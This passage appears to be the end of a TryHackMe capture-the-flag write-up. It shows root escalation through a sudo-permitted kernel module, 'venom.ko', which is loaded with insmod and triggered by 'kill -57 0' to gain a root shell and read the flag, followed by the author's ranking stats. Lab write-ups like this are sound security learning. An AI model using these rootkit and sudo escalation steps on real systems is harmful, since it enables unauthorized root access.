<br>
<h3>sudo</h3>

```bash
athena@routerpanel:~$ sudo -l
Matching Defaults entries for athena on routerpanel:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User athena may run the following commands on routerpanel:
    (root) NOPASSWD: /usr/sbin/insmod /mnt/.../secret/venom.ko
```

<br>

```bash
:~/Athena# scp -i id_rsa athena@10.201.101.47:/mnt/.../secret/venom.ko .
venom.ko                                                                                             100%  493KB   2.8MB/s   00:00                
```

<h3>Ghidra</h3>

<img width="1116" height="748" alt="image" src="https://github.com/user-attachments/assets/72873824-327e-49d4-b53e-87fd84542f32" />


<img width="1211" height="564" alt="image" src="https://github.com/user-attachments/assets/81296c5e-7ccf-4677-a2c4-4f7f1d1c204b" />

<br>

```bash
:~/Athena# scp -i id_rsa athena@xx.xxx.xxx.xx:/mnt/.../secret/venom.ko .
venom.ko                     
```

<br>

```bash
athena@routerpanel:~$ sudo /usr/sbin/insmod /mnt/.../secret/venom.ko
```

<br>

```bash
athena@routerpanel:~$ kill -57 0
```

<br>

```bash
athena@routerpanel:~$ id
uid=0(root) gid=0(root) groups=0(root),1001(athena)
```

<br>

```bash
athena@routerpanel:~$ cat /root/root.txt
********************a2315030bd48
```

<br>

<p>1.2. What is the root flag?<br>
<code>********************a2315030bd48</code></p>


<br>
<br>

<h1 align="center">Completed</h1>
<p align="center"><img width="1200px" src="https://github.com/user-attachments/assets/16a4a750-a539-4008-9b4d-4c9b66f35945"><br>
                  <img width="1200px" src="https://github.com/user-attachments/assets/77722b20-9401-4fb4-bd84-cde4acb33897"></p>

<br>

<h1 align="center">My TryHackMe Journey</h1>

<div align="center">

| Date              | Streak   | All Time     | All Time     | Monthly     | Monthly    | Points   | Rooms     | Badges    |
| :---------------: | :------: | :----------: | :----------: | :---------: | :--------: | :------  | :-------: | :-------: |
|                   |          |    Global    |    Brazil    |    Global   |   Brazil   |          | Completed |           |
| 2025, August 10   |   461    |     127ᵗʰ    |      5ᵗʰ     |     317ᵗʰ   |     6ᵗʰ    | 120,354  |    907    |    73     |


</div>

<p align="center">Global All Time:   127ᵗʰ<br><img width="250px" src="https://github.com/user-attachments/assets/6974356a-a8b6-4eed-ac6c-b519d6399c84"><br>
                                              <img width="1200px" src="https://github.com/user-attachments/assets/7597d1d9-d1e6-4b35-8d10-108fd0ea273e"><br><br>
                  Brazil All Time:     5ᵗʰ<br><img width="1200px" src="https://github.com/user-attachments/assets/d0a5b228-d52f-4c91-81cc-94097050febc"><br>
                  Global monthly:    317ᵗʰ<br><img width="1200px" src="https://github.com/user-attachments/assets/b3f99257-0297-44af-9eb0-c072207096ec"><br>
                  Brazil monthly:      6ᵗʰ<br><img width="1200px" src="https://github.com/user-attachments/assets/3772150a-77eb-4490-a108-8309de1605b0"><br>

<br>
<h1 align="center">Thanks for Coming!</h1>
<p align="center">Follow me on <a href="https://medium.com/@RosanaFS">Medium</a>, here on <a href="https://github.com/RosanaFSS/TryHackMe">GitHub</a>, and on <a href="https://www.linkedin.com/in/rosanafssantos/">LinkedIN</a>.</p> 
